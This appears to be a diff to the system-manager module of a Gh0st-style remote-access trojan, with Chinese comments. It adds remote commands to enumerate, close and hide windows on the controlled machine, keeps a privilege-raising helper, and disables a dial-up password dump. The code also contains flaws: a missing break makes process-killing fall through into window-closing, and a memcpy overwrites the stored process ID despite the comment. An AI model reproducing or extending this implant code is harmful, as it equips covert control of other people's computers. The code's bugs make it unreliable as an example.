@@ -17,9 +17,17 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
+CSystemManager::CSystemManager(CClientSocket *pClient, BYTE bHow) : CManager(pClient)
 {
-	SendProcessList();
+	m_caseSystemIs = bHow;
+	if (m_caseSystemIs == COMMAND_SYSTEM)     //如果是获取进程
+	{
+		SendProcessList();
+	}
+	else if (m_caseSystemIs == COMMAND_WSLIST)   //如果是获取窗口
+	{
+		SendWindowsList();
+	}
 }
 
 CSystemManager::~CSystemManager()
@@ -28,20 +36,26 @@ CSystemManager::~CSystemManager()
 }
 void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
+
 	SwitchInputDesktop();
-	switch (lpBuffer[0])
+	switch (lpBuffer[0])//这里是进程管理接收数据的函数了 判断是哪个命令
 	{
-	case COMMAND_PSLIST:
-		SendProcessList();
+	case COMMAND_PSLIST:				//发送进程列表
+		SendProcessList();	
 		break;
-	case COMMAND_WSLIST:
+	case COMMAND_WSLIST:				//发送窗口列表
 		SendWindowsList();
 		break;
-	case COMMAND_DIALUPASS:
-		SendDialupassList();
+	case COMMAND_DIALUPASS:				//保留20200530
 		break;
-	case COMMAND_KILLPROCESS:
+	case COMMAND_KILLPROCESS:			//关闭进程
 		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
+	case COMMAND_WINDOW_CLOSE:			//关闭窗口
+		CloseTheWindow(lpBuffer + 1);	
+		break;
+	case COMMAND_WINDOW_TEST:			//最大化最小化 隐藏窗口函
+		ShowTheWindow(lpBuffer + 1);    
+		break;
 	default:
 		break;
 	}
@@ -64,14 +78,18 @@ void CSystemManager::SendProcessList()
 void CSystemManager::SendWindowsList()
 {
 	UINT	nRet = -1;
+	//获取窗口列表数据
 	LPBYTE	lpBuffer = getWindowsList();
 	if (lpBuffer == NULL)
 		return;
 
+	//发送遍历到的窗口数据
 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);	
 }
 
+
+//保留20200530
 void CSystemManager::SendDialupassList()
 {
 	CDialupass	pass;
@@ -280,6 +298,7 @@ LPBYTE CSystemManager::getProcessList()
 	return lpBuffer;	
 }
 
+//提权
 bool CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
 {
 	BOOL              bResult = TRUE;
@@ -312,6 +331,7 @@ void CSystemManager::ShutdownWindows( DWORD dwReason )
 	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
 }
 
+//窗口回调遍历所有窗口
 bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
 	DWORD	dwLength = 0;
@@ -321,21 +341,27 @@ bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	
 	char	strTitle[1024];
 	memset(strTitle, 0, sizeof(strTitle));
+	//获取传进来的窗口句柄的标题
 	GetWindowText(hwnd, strTitle, sizeof(strTitle));
-	
+	//判断窗口是否可见，标题是否为空
 	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
 		return true;
 	
-	
+	//如果指针为空的话申请一个堆
+	//（该函数时循环的所以第二次进来就不是空的，用动态的LocalReAlloc改变堆大小实现数据都在一个堆上）
 	if (lpBuffer == NULL)
+		//第一次申请大小为1是因为第一字节为通知控制端标识
 		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
 	
 	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
 	dwOffset = LocalSize(lpBuffer);
 	
+	//计算缓冲区大小
 	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
 	
+	//获取窗口的创建者 + 两个memcpy数据结构为 创建者PID + hwnd + 窗口标题 + 0
 	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
+	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
 	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
 	
 	*(LPBYTE *)lParam = lpBuffer;
@@ -343,6 +369,8 @@ bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	return true;
 }
 
+
+//获取窗口列表数据
 LPBYTE CSystemManager::getWindowsList()
 {
 	LPBYTE	lpBuffer = NULL;
@@ -350,6 +378,27 @@ LPBYTE CSystemManager::getWindowsList()
 	//枚举屏幕上的所有的顶层窗口，轮流地将这些窗口的句柄传递给一个应用程序定义的回调函数。
 	//EnumWindows会一直进行下去，直到枚举完所有的顶层窗口，或者回调函数返回了FALSE.
 	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
+
+	//数据头填充TOKEN_WSLIST主控端识别
 	lpBuffer[0] = TOKEN_WSLIST;
 	return lpBuffer;	
+}
+
+
+//关闭窗口
+void CSystemManager::CloseTheWindow(LPBYTE buf)
+{
+	DWORD hwnd;
+	memcpy(&hwnd, buf, sizeof(DWORD));				//得到窗口句柄 
+	::PostMessage((HWND__ *)hwnd, WM_CLOSE, 0, 0);	//向窗口发送关闭消息
+}
+
+//显示窗口
+void CSystemManager::ShowTheWindow(LPBYTE buf)
+{
+	DWORD hwnd;
+	DWORD dHow;
+	memcpy((void*)&hwnd, buf, sizeof(DWORD));				//得到窗口句柄
+	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));		//得到窗口处理参数
+	ShowWindow((HWND__ *)hwnd, dHow);
 }
